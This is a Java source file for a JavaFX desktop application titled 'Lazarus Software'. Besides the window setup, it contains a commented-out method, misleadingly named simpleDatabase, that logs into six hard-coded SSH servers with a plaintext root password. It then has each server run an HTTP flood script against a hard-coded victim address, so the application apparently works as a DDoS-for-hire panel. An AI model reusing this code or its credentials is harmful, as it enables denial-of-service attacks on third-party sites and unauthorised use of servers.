import com.jcraft.jsch.Session;
import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.fxml.FXMLLoader;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.stage.Stage;

import java.io.IOException;

public class Main extends Application {
    @Override
    public void start(Stage primaryStage) throws Exception {
        Parent root = FXMLLoader.load(getClass().getResource("sample.fxml"));
        primaryStage.setTitle("[Welcome To Lazarus Software]");
        primaryStage.setResizable(false);
        primaryStage.setScene(new Scene(root, 800, 450));
        primaryStage.getIcons().add(new Image(getClass().getResourceAsStream("icon.png")));
        primaryStage.show();
    }
    public static void switchScene(ActionEvent event,String sceneStr) throws IOException {
        Parent root = FXMLLoader.load(Main.class.getResource(sceneStr));
        Stage stage = (Stage)((Node) event.getSource()).getScene().getWindow();
        Scene scene = new Scene(root,900,500);
        stage.setTitle("[Welcome To Lazarus Software]");
        stage.setScene(scene);
        stage.setResizable(false);
        stage.show();

    }
    /*public void simpleDatabase() throws InterruptedException {
        String pass = "root2405";
        String user = "root";
        String victim="http://23.227.142.74/";
        String portVictim = "80";
        String thread = "1";
        int time = 10;
        String attackHttp = "python3 HttpBypass.py";
        List<String> servers = new ArrayList<>();
        List<sshConnection> threads = new ArrayList<>();
        servers.add("172.105.149.152");
        servers.add("45.56.75.254");
        servers.add("66.175.223.37");
        servers.add("69.164.222.181");
        servers.add("172.105.103.69");
        servers.add("178.79.188.253");
        String port = "22";
        for (String host : servers) {
            sshConnection currentConnection = new sshConnection();
            threads.add(currentConnection);
            currentConnection.setup(user,pass,host,port);
            Session session = currentConnection.getSession();
            sshCommand currentCommand = sshCommand.getInstance();
            currentCommand.setup(session);
            currentCommand.sendCommand(attackHttp+" "+victim+" "+portVictim+" "+time+" "+thread);
        }
        //Thread.wait(time*1000);
        wait(time*1000);
        for(sshConnection connection:threads){
            connection.closeConnection();
        }
    }*/

    public static void main(String[] args) throws InterruptedException {
        launch(args);
        //simpleDatabase();
    }


}
